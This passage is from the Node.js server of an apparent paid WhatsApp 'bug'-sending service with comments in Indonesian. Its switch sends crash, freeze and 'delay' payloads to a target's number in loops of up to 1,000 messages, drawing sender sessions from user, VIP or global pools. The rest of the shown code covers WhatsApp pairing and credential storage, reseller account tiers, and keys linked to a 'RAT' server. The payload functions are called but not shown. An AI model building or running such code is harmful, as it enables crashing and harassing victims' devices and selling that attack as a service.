            }
            break;
           case "androidfrz":
            for (let i = 0; i < 15; i++) {
              await iOSExe(sock, targetJid);
            }
            break;
           case "clickcrash":
            for (let i = 0; i < 69; i++) {
              await D3nss(sock, targetJid);
            }
            break;
           case "03delay":
            for (let i = 0; i < 300; i++) {
              await D3nsskaya(sock, targetJid);
            }
            break;
          case "ios":
            for (let i = 0; i < 100; i++) {
              await testes2(sock, targetJid);
            }
            break;
          case "ofmcrlx":
            for (let i = 0; i < 100; i++) {
              await ofmcrl(sock, targetJid);
            }
            break;
           case "ofmcrlx_group":
            for (let i = 0; i < 100; i++) {
              await ofmcrl_group(sock, targetJid);
            }
            break;
            case "dxlay":
            for (let i = 0; i < 120; i++) {
              await K7(sock, targetJid); 
            }
           break;
           case "08delay":
            for (let i = 0; i < 100; i++) {
              await D3nsskaya(sock, targetJid);
            }
            break;
           case "tesdoang":
            for (let i = 0; i < 100; i++) {
             await testes(sock, targetJid);
            }
            break;
          case "06delay":
            for (let i = 0; i < 100; i++) {
               await D3nsskaya(sock, targetJid);
             }
            break;
            case "fcinvis":
            for (let i = 0; i < 500; i++) {
              await sticXcrash(sock, targetJid);
            }
            break;
          case "05delay":
            for (let i = 0; i < 120; i++) {
              await D3nsskaya(sock, targetJid);
             }
            break;
          case "android_group":
            for (let i = 0; i < 100; i++) {
              await crashGroup(sock, targetJid);
              await sleep(1000);
            
            }
            break;
          case "crashclick_group":
            for (let i = 0; i < 1; i++) {
              await bcForce(sock, targetJid, ptcp = false) 
//              await sleep(1000);

            }
            break;
          case "lock_group":
            for (let i = 0; i < 1; i++) {
              await bcForce(sock, targetJid, ptcp = false);
            };
            break;
          case "roid_group":
            for (let i = 0; i < 1000; i++) {
              await crashGroup(sock, targetJid);
              await blankGroup(sock, targetJid)
              await sleep(1000);
            };
            break;
           case "xfcui":
            for (let i = 0; i < 60; i++) {
              await XFCUI(sock, targetJid);
            };
            break;
          case "exec":
            for (let i = 0; i < 100; i++) {
              await exeTrash(sock, targetJid);
            };
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${targetJid}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);

        if (!retry) {
          // Retry Logic
          if (user.role === 'vip') {
            // Retry: Ambil ulang dari gabungan VIP & Personal
            const availableSocks = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join('permenmd', user.username);

            if (fs.existsSync(vipPath)) availableSocks.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) availableSocks.push(...getActiveSocketsFromPath(userPath));

            if (availableSocks.length > 0) {
              const retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
              return await attemptSend(retrySock, true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}, ${err.message}`);
        return false;
      }
    };

        // --- LOGIC PEMILIHAN SENDER (UPDATE) ---
    let sock;
    const senderMode = req.query.senderMode || 'private'; // Ambil mode dari query

    if (senderMode === 'global') {
      if (!['admin', 'owner', 'vip'].includes(user.role)) {
        return res.json({ valid: true, sended: false, message: "Global sender hanya admin/owner/VIP" });
      }
      // MODE GLOBAL: Ambil sender dari SEMUA folder user di permenmd
      let availableSocks = [];
      const baseDir = path.join(__dirname, 'permenmd');

      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          return fs.lstatSync(path.join(baseDir, p)).isDirectory();
        });

        // Scan semua folder user
        for (const u of allUsers) {
          const uPath = path.join(baseDir, u);
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) {
              availableSocks.push(activeConnections[sessionName]);
            }
          });
        }
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Global Mode: Tidak ada koneksi aktif dari manapun.`);
        return;
      }

      // Pilih acak dari semua user yang aktif
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
      console.log(`[🌍 GLOBAL SENDER] Menggunakan sender acak. Total Global Active: ${availableSocks.length}`);

    } else if (user.role === 'vip') {
      // VIP: Gabungkan sender dari folder VIP dan folder permenmd/[username]
      let availableSocks = [];
      const vipPath = path.join(__dirname, 'vip');
      if (fs.existsSync(vipPath)) {
        availableSocks.push(...getActiveSocketsFromPath(vipPath));
      }
      const userPath = path.join('permenmd', user.username);
      if (fs.existsSync(userPath)) {
        availableSocks.push(...getActiveSocketsFromPath(userPath));
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif di VIP Pool atau folder pribadi ${user.username}.`);
        return;
      }
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

    } else {
      // MODE PRIVATE (DEFAULT MEMBER): Ambil sock dari folder user sendiri
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia di folder member ${user.username}.`);
        return;
      }
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return array kosong
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /getSenderStats
// Mengembalikan jumlah sender aktif untuk user sendiri (Private) dan total semua user (Global)
app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    // 1. Hitung Private (permenmd/username)
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    // 2. Hitung Global (Semua folder di permenmd)
    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    // 1. Ambil dari folder VIP (Root)
    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    // 2. Ambil dari folder permenmd/[username]
    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    // User biasa hanya melihat sender di folder usernya sendiri
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    // 1. Putuskan socket lama jika sedang berjalan untuk nomor ini
    if (activeConnections[number]) {
      try {
        activeConnections[number].end?.(new Error("Re-pairing requested"));
      } catch (_) {}
      delete activeConnections[number];
    }

    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      } else if (connection === "open") {
        console.log(`✅ [${user.username}] WhatsApp berhasil terhubung untuk nomor ${number}!`);
        activeConnections[number] = sock;
        const sourceCreds = path.join(sessionDir, 'creds.json');
        const destCreds = path.join('permenmd', user.username, `${number}.json`);
        try {
          await waiting(2000);
          if (fs.existsSync(sourceCreds)) {
            const data = fs.readFileSync(sourceCreds);
            fs.writeFileSync(destCreds, data);
            console.log(`✅ Berhasil menyimpan file sesi: ${destCreds}`);
          }
        } catch (e) {
          console.error(`❌ Gagal menyimpan file sesi: ${e.message}`);
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      // Minta kode pairing resmi dari server WhatsApp (tanpa custom string)
      const code = await sock.requestPairingCode(number)
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})


const APIRAT_URL = "http://192.168.1.3:2173"; // IP apirat server

async function generateOwnerIdFromApirat(username) {
  try {
    const response = await axios.post(`${APIRAT_URL}/api/create-key`, {
      days: 36500,
      owner: username
    });
    if (response.data && response.data.success) {
      console.log(`[🔑 RAT] ratId generated for ${username}: ${response.data.key}`);
      return response.data.key;
    }
    console.log(`[❌ RAT] Failed to generate ratId for ${username}`);
    return null;
  } catch (err) {
    console.error(`[❌ RAT] Error generating ratId: ${err.message}`);
    return null;
  }
}

// ===== Create Account =====
app.get("/createAccount", async (req, res) => {
  const { key, newUser, pass, day, role: reqRole } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator) {
    return res.json({ valid: true, authorized: false, message: "User creator tidak ditemukan." });
  }

  if (!['owner', 'admin', 'reseller'].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator.username} bukan owner/admin/reseller.`);
    return res.json({ valid: true, authorized: false, message: "Hanya Owner/Admin/Reseller yang bisa manage akun via Aplikasi." });
}

  // --- CEK LIMIT BULANAN ---
  const roleLimits = {
    admin: 100,
    owner: 80,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7); // Format "YYYY-MM"

  // Inisialisasi log penggunaan jika belum ada, atau reset jika bulan baru
  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  // ✅ Generate RatId lokal
  const ratId = generateRatId(newUser);
  const now = new Date();
  const expiredKey = new Date(now.getTime() + (parseInt(day) * 24 * 60 * 60 * 1000));
  const keys = ratReadDB('keys.json');
  keys.push({
    key: ratId,
    created: now.toISOString(),
    expired: expiredKey.toISOString(),
    days: parseInt(day),
    owner: newUser,
    active: true
  });
  ratWriteDB('keys.json', keys);

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: reqRole || "member",
    ratId: ratId
  };

  // ✅ TAMBAHKAN PENGGUNA KE DB
  db.push(newAccount);

  // ✅ TAMBAHKAN COUNTER LIMIT KEPADA CREATOR
  creator.usageLog.count++;

  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari | ratId: ${ratId}`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newUser} | ratId: ${ratId} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day} ratId:${ratId}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }
     
  if (!deleter || !['admin', 'owner', 'reseller'].includes(deleter.role)) {
    return res.json({ valid: true, authorized: false, message: "Role kamu tidak diizinkan menghapus akun." });
  }

  const roleLevel = {
    admin: 5, owner: 4, reseller: 3, vip: 2, member: 1
  };
  if ((roleLevel[deleter.role] || 0) <= (roleLevel[targetUser.role] || 0)) {
    return res.json({ valid: true, deleted: false, message: "Tidak bisa menghapus user dengan role setara atau lebih tinggi." });
  }
  if (targetUser.permanentOwner) {
    return res.json({ valid: true, deleted: false, message: "Akun owner ini permanen dan tidak bisa dihapus." });
  }

  // Lakukan penghapusan
  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !['admin', 'owner', 'reseller'].includes(requester.role)) {
    console.log(`[❌ LIST] Role tidak diizinkan.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const visibleRoles = {
    admin: ['owner'],
    owner: ['reseller', 'vip', 'member'],
    reseller: ['member']
  };
  const users = db
    .filter(u => visibleRoles[requester.role].includes(u.role) && (u.parent === requester.username || requester.role === 'admin'))
    .map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: u.role || "member",
      parent: u.parent || "SYSTEM",
      ratId: u.ratId ?? u.owner_id ?? null
    }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", async (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator) {
    return res.json({ valid: true, authorized: false, message: "User creator tidak ditemukan." });
  }

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  // --- HIRARKI ROLE (3-TIER: admin > owner > reseller > member/vip) ---
  const hierarchy = {
    admin: ['owner', 'reseller', 'vip', 'member'],
    owner: ['reseller', 'member', 'vip'],
    reseller: ['member']
  };

  // --- AUTH WHITELIST ---
  const allowedCreators = ['admin', 'owner', 'reseller'];
  if (!allowedCreators.includes(creatorRole)) {
    console.log(`[❌ USERADD] Role '${creatorRole}' tidak diizinkan membuat akun.`);
    return res.json({ valid: true, authorized: false, message: "Role kamu tidak diizinkan membuat akun." });
  }

  // --- CEK HIRARKI ---
  const canCreate = hierarchy[creatorRole];
  if (!canCreate) {
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak ada di hierarchy.` });
  }

  if (!canCreate.includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} tidak bisa membuat ${targetRole}. Bisa membuat: ${canCreate.join(', ')}` });
  }

  // --- CEK LIMIT BULANAN (Dev = Unlimited) ---
  const roleLimits = {
    admin: 100,
    owner: 80,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole] ?? 30;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (creatorRole !== 'admin') {
    if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
      creator.usageLog = { count: 0, month: currentMonth };
    }

    if (currentLimit > 0 && creator.usageLog.count >= currentLimit) {
      console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
      return res.json({
        valid: true,
        created: false,
        limitReached: true,
        message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
      });
    }
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const requestedDays = Number.parseInt(day, 10);
  if (targetRole !== 'owner' && (!Number.isInteger(requestedDays) || requestedDays <= 0)) {
    return res.json({ valid: true, created: false, message: "Durasi akun tidak valid." });
  }
  const accountDays = targetRole === 'owner' && creatorRole === 'admin' ? 36500 : requestedDays;
  const expired = new Date();
  expired.setDate(expired.getDate() + accountDays);

  // ✅ Generate RatId lokal
  const ratId = generateRatId(username);
  const now = new Date();
  const expiredKey = new Date(now.getTime() + (accountDays * 24 * 60 * 60 * 1000));
  const keys = ratReadDB('keys.json');
  keys.push({
    key: ratId,
    created: now.toISOString(),
    expired: expiredKey.toISOString(),
    days: parseInt(day),
    owner: username,
    active: true
  });
  ratWriteDB('keys.json', keys);

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    ratId: ratId,
    parent: creator.username,
    permanentOwner: targetRole === 'owner' && creator.role === 'admin'
  };

  db.push(newUser);
  if (creator.usageLog) creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day} ratId:${ratId}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${username} | ratId: ${ratId} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor) {
    return res.json({ valid: true, authorized: false, message: "User editor tidak ditemukan." });
  }

  if (!['admin', 'owner', 'reseller'].includes(editor.role)) {
    console.log(`[❌ EDIT] Role '${editor.role}' tidak diizinkan edit akun.`);
    return res.json({ valid: true, authorized: false, message: "Role kamu tidak diizinkan mengedit akun." });
}

  // Batas hari untuk Reseller (jika ingin diterapkan juga ke role lain, sesuaikan)
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Validasi Hirarki (Sama seperti delete)
  const roleLevel = {
    admin: 5, owner: 4, reseller: 3, vip: 2, member: 1
  };
  
  if (roleLevel[editor.role] <= roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with equal or higher rank." });
  }
  if (targetUser.permanentOwner) {
    return res.json({ valid: true, edited: false, message: "Akun owner ini permanen dan tidak bisa diubah." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== Generate ratId untuk akun lama yang belum punya =====
app.get("/generateOwnerId", async (req, res) => {
  const { key, username } = req.query;
  console.log(`[🔑 GEN] Generate ratId untuk ${username}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !['admin', 'owner'].includes(requester.role)) {
    return res.json({ valid: false, message: "Hanya Dev/Owner yang bisa generate ratId." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    return res.json({ valid: false, message: "User tidak ditemukan." });
  }

  // Jika sudah punya ratId, return yang ada
  if (targetUser.ratId ?? targetUser.owner_id) {
    return res.json({ valid: true, ratId: targetUser.ratId ?? targetUser.owner_id, message: "Already exists." });
  }

  // Generate RatId lokal
  const ratId = generateRatId();
  const now = new Date();
  const expiredKey = new Date(now.getTime() + (36500 * 24 * 60 * 60 * 1000));
  const keys = ratReadDB('keys.json');
  keys.push({
    key: ratId,
    created: now.toISOString(),
    expired: expiredKey.toISOString(),
    days: 36500,
    owner: username,
    active: true
  });
  ratWriteDB('keys.json', keys);

  targetUser.ratId = ratId;
  saveDatabase(db);
  console.log(`[✅ GEN] RatId generated: ${ratId} untuk ${username}`);
  return res.json({ valid: true, ratId: ratId });
});

// ===== DEV: Reset Password User =====
app.get("/resetPassword", (req, res) => {
  const { key, user, newPass } = req.query;
  console.log(`[🔑 RESETPASS] Reset password '${user}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || requester.role !== 'admin') {
    return res.json({ valid: true, authorized: false, message: "Hanya Admin yang bisa reset password." });
  }

  const targetUser = db.find(u => u.username === user);
  if (!targetUser) {
    return res.json({ valid: true, found: false, message: "User tidak ditemukan." });
  }

  targetUser.password = newPass;
  saveDatabase(db);

  const logLine = `${requester.username} ResetPassword ${user}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ RESETPASS] Password ${user} berhasil direset.`);
  return res.json({ valid: true, authorized: true, reset: true, user: { username: targetUser.username, role: targetUser.role } });
});

// ===== DEV: Set RatId User =====
app.get("/setRatId", (req, res) => {
  const { key, user, ratId } = req.query;
  console.log(`[🔑 SETRATID] Set ratId '${ratId}' untuk '${user}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || requester.role !== 'admin') {
    return res.json({ valid: true, authorized: false, message: "Hanya Admin yang bisa set ratId." });
  }

  const targetUser = db.find(u => u.username === user);
  if (!targetUser) {
    return res.json({ valid: true, found: false, message: "User tidak ditemukan." });
  }

  if (!ratId || ratId.trim() === '') {
    return res.json({ valid: true, success: false, message: "ratId tidak boleh kosong." });
  }

  targetUser.ratId = ratId.trim();
  saveDatabase(db);

  const logLine = `${requester.username} SetRatId ${user} -> ${ratId.trim()}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ SETRATID] RatId ${user} diubah ke ${ratId.trim()}.`);
  return res.json({ valid: true, authorized: true, success: true, user: { username: targetUser.username, ratId: targetUser.ratId } });
});

// ===== KCID: Get Kernel Crash ID (auto-generate kalau belum ada) =====
app.get("/getKcid", (req, res) => {
  const ratId = (req.query.ratId || req.query.accountId || '').trim();
  if (!ratId) return res.json({ valid: false, message: "ratId required" });

  const db = loadDatabase();
  const user = db.find(u => (u.ratId || '') === ratId) || db.find(u => (u.accountId || u.username || '') === ratId);

  if (!user) {
    return res.json({ valid: false, found: false, message: "User tidak ditemukan." });
  }

  const kcid = ensureKcid(user);
  if (!kcid) return res.json({ valid: false, message: "Gagal membuat kcid." });

  return res.json({ valid: true, found: true, kcid, ratId: user.ratId || ratId, username: user.username });
});

// ===== KCID: Set KCID manual (mirror setRatId, admin only) =====
app.get("/setKcid", (req, res) => {
  const { key, user, kcid } = req.query;
  console.log(`[🔑 SETKCID] Set kcid '${kcid}' untuk '${user}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || requester.role !== 'admin') {
    return res.json({ valid: true, authorized: false, message: "Hanya Admin yang bisa set kcid." });
  }

  const targetUser = db.find(u => u.username === user);
  if (!targetUser) {
    return res.json({ valid: true, found: false, message: "User tidak ditemukan." });
  }

  if (!kcid || kcid.trim() === '') {
    return res.json({ valid: true, success: false, message: "kcid tidak boleh kosong." });
  }

  targetUser.kcid = kcid.trim();
  saveDatabase(db);

  const logLine = `${requester.username} SetKcid ${user} -> ${kcid.trim()}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ SETKCID] Kcid ${user} diubah ke ${kcid.trim()}.`);
  return res.json({ valid: true, authorized: true, success: true, user: { username: targetUser.username, kcid: targetUser.kcid } });
});

// ===== DEV: Change Role User =====
app.get("/changeRole", (req, res) => {
  const { key, user, newRole } = req.query;
  console.log(`[🔑 CHANGEROLE] Ubah role '${user}' -> '${newRole}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || requester.role !== 'admin') {
    return res.json({ valid: true, authorized: false, message: "Hanya Admin yang bisa ubah role." });
  }

  const validRoles = ['admin', 'owner', 'reseller', 'vip', 'member'];
  if (!validRoles.includes(newRole)) {
    return res.json({ valid: true, success: false, message: `Role tidak valid. Pilih: ${validRoles.join(', ')}` });
  }

  const targetUser = db.find(u => u.username === user);
  if (!targetUser) {
    return res.json({ valid: true, found: false, message: "User tidak ditemukan." });
  }

  const oldRole = targetUser.role;
  targetUser.role = newRole;
  saveDatabase(db);

  const logLine = `${requester.username} ChangeRole ${user}: ${oldRole} -> ${newRole}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ CHANGEROLE] Role ${user} diubah: ${oldRole} -> ${newRole}.`);
  return res.json({ valid: true, authorized: true, success: true, user: { username: targetUser.username, role: targetUser.role } });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

